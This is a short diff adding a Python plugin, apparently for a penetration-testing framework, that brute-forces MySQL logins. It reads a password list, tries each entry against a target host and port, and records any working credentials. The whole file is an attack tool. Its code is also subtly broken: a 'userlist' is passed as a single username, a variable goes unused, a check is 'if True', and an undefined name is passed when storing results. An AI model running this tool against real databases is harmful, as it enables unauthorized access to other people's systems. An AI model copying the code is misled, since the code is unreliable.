@@ -1,0 +1,28 @@
+#!/usr/bin/env python3
+Description = 'Bruteforce SQL Protocol.'
+
+from pluginsupport import *
+
+target = ask('rhost')
+rport = ask('rport')
+users = ask('userlist')
+passlist = ask('passlist')
+
+def run():
+	import MySQLdb
+
+	try:
+		df = "admin"
+
+		with open(passlist,'r') as passwords:
+			for password in passwords:
+				password=password.replace("\n","")
+				try:
+					MySQLdb.connect(target,users,password,'',int(rport))
+					if True:
+						success("Successfully with ["+users+"]["+password+"]\n")
+						UTIL.sRegister(init,password)
+				except:
+					fail(" | Checking '"+password+"'")
+	except KeyboardInterrupt:
+		exit()
